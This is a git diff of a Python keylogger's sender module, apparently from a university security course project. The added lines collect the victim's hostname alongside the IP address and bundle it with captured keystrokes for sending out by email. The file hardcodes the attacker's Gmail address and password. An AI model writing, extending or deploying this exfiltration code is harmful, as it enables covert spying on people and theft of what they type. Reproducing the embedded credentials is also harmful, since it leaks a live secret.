@@ -9,7 +9,7 @@ import Queue
 import socket
 
 destEmail = 'keylogsenderUIUC460@gmail.com'
-dataBufferSize = 100
+dataBufferSize = 500
 hackeremail = "keylogsenderUIUC460"
 hackerpwd =  "qazwsxedcrfv"
 local = False
@@ -73,9 +73,12 @@ def serverSetup():
 def send_data(msg, victimInfo):
 	try:
                 victimIP = victimInfo.get('IP')
-
+                victimHostName = victimInfo.get('Hostname')
+                
                 #build message
-                fullmsg = '\n Source IP:' + str(victimIP) + '\n\n\n\n' + str(msg)
+                fullmsg =       ('\n Source IP:' + str(victimIP) +
+                                '\n HostName:' + str(victimHostName) +
+                                '\n\n\n\n' + str(msg))
 		print('Message: \n\n' + fullmsg)
 		
 		if(local):
@@ -138,10 +141,10 @@ def run_sender():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         victimIP = s.getsockname()[0]
-        print("Victim IP: " + str(victimIP))
         s.close()
-
         victimInfo['IP'] = victimIP
+
+        victimInfo['Hostname'] = socket.gethostname()
         
 	if(local):
 		f = open('keylog.txt', 'w')
